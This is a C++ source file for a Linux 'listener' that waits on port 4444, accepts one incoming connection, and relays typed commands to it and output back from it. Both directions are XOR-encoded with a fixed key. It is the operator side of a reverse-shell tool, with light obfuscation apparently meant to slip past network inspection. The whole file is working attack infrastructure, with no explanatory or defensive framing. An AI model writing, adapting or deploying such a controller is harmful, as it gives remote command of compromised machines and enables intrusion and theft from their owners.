// Listener for Linux

#include <iostream>
#include <cstring>
#include <thread>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 4444
#define XOR_KEY 0x5A

void xor_transform(char* buffer, ssize_t len) 
{
    for (ssize_t i = 0; i < len; ++i) 
    {
        buffer[i] ^= XOR_KEY;
    }
}

void receive_loop(int client_sock) 
{
    char buffer[1024];
    while (true) 
    {
        ssize_t bytes_received = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received <= 0) 
        {
            std::cout << "\n[Disconnected]" << std::endl;
            break;
        }
        xor_transform(buffer, bytes_received);
        std::cout.write(buffer, bytes_received);
        std::cout.flush();
    }
}

int main() 
{
    int server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) 
    {
        perror("socket");
        return 1;
    }

    sockaddr_in server_addr{};
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_sock, (sockaddr*)&server_addr, sizeof(server_addr)) < 0) 
    {
        perror("bind");
        close(server_sock);
        return 1;
    }

    if (listen(server_sock, 1) < 0) 
    {
        perror("listen");
        close(server_sock);
        return 1;
    }

    std::cout << "[+] Waiting for incoming connection on port " << PORT << "..." << std::endl;

    sockaddr_in client_addr{};
    socklen_t client_len = sizeof(client_addr);
    int client_sock = accept(server_sock, (sockaddr*)&client_addr, &client_len);
    if (client_sock < 0) 
    {
        perror("accept");
        close(server_sock);
        return 1;
    }

    std::cout << "[+] Connection from " << inet_ntoa(client_addr.sin_addr) << std::endl;

    std::thread recv_thread(receive_loop, client_sock);
    recv_thread.detach();

    std::string input;
    while (true) 
    {
        std::getline(std::cin, input);
        if (input == "exit" || input == "quit") 
        {
            break;
        }
        input += "\n";
        xor_transform(&input[0], input.size());
        send(client_sock, input.c_str(), input.size(), 0);
    }

    close(client_sock);
    close(server_sock);
    std::cout << "[+] Connection closed." << std::endl;
    return 0;
}
